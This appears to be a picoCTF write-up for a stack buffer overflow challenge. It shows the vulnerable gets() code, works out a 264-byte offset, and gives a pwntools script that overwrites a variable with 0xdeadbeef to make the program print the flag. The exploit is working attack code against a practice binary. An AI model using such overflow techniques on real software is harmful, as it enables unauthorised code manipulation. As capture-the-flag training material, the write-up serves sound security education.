# Clutter-Overflow-Medium Writeup

**Flag:** `picoCTF{...}`

---

## Summary

This challenge contains a **stack-based buffer overflow**. The binary reads user input into a fixed-size buffer (`gets(clutter)`), which has **no bounds checking**. Immediately above the buffer on the stack is a variable `code` which the program checks against `0xdeadbeef`. By overflowing the buffer and writing the target value to `code`, we can trigger the flag output.

---

## Vulnerability

Relevant snippet:

```c
long code = 0;
char clutter[0x100];

gets(clutter);  // unsafe, no bounds check

if (code == 0xdeadbeef) {
    system("cat flag.txt");
}
```

* `clutter` is **256 bytes** (`0x100`).
* `code` is stored **right above the buffer on the stack** (`rbp-0x8`).
* `gets()` allows writing **beyond the buffer**, overwriting `code`.

---

## Exploitation Strategy

1. **Calculate offset to `code`**

   * Buffer = `0x100` bytes.
   * Stack padding / alignment = 8 bytes (`rbp-0x10`).
   * Offset to overwrite `code` = `0x100 + 8 = 264 bytes`.

2. **Overwrite `code`**

   * Construct payload:

     ```
     "X" * 264 + p32(0xdeadbeef)
     ```
   * This writes `0xdeadbeef` to `code`.

3. **Trigger the check**

   * The program checks:

     ```c
     if (code == 0xdeadbeef)
         system("cat flag.txt");
     ```
   * Overflowing `code` with `0xdeadbeef` satisfies the condition and prints the flag.

---

## Exploit Script Overview

```python
from pwn import *

context.arch = 'amd64'

payload = b"X"*264
payload += p32(0xdeadbeef)

conn = process("./chall")   # or remote(HOST, PORT)
conn.recvuntil("What do you see?")
conn.sendline(payload)
conn.interactive()  # get the flag output
```

* Uses `pwntools` for local/remote execution.
* Payload size = buffer (0x100) + padding (8 bytes) + `code` (4 bytes for 0xdeadbeef).
* Sending this payload triggers the flag display.

---

## Final Notes

* **Vulnerability:** classic stack buffer overflow with `gets()`.
* **Target variable:** `code` stored above buffer.
* **Defense:** never use `gets()`. Use `fgets()` or add explicit bounds checks.
* **Takeaway:** Understanding stack layout is crucial for crafting overflows. Buffer + padding offset allows overwriting sensitive variables safely.
